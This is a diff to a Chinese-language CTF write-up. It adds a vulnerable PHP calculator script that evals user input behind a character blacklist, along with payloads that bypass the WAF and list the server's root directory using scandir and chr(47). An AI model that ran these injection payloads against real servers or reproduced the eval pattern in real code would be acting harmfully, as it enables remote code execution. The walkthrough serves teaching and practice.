@@ -303,8 +303,40 @@ ls执行后第一行就是flag.php
 查看源码<br>
 ![image](https://github.com/xhsy0314/Task/assets/84487619/7d9ea08a-13b4-4142-b0c2-9a917640e8fc)
 <br>
-发现存在一个calc.php，进入这个文件看看。是一段php代码。
+发现存在一个calc.php，并且设置了waf，WAF会限制我们对num的输入，不能出现字母。进入这个calc文件看看。是一段php代码。
 <br>
+```
+<?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?>
+```
+对于WAF，通过在num和？间加一个空格就可以绕过：
+```
+/calc.php? num=......
+```
+接下来，我们需要从文件夹里找出flag，这就需要我们通过scandir()函数读取文件夹里的文件，再用print_r输出：
+```
+/calc.php? num=print_r(scandir("/"))
+```
+不过由于 / 被过滤了，因此得换种方法，可以尝试用<chr(对应ascii码值)>来替代
+例如这里我们需要替换 / ，而 / 的ascii码值为47，所以可以采用：
+```
+/calc.php? num=print_r(scandir(chr(47)))
+```
+
+                scandir() 函数返回指定目录中的文件和目录的数组
 
 4.堆叠注入
 -
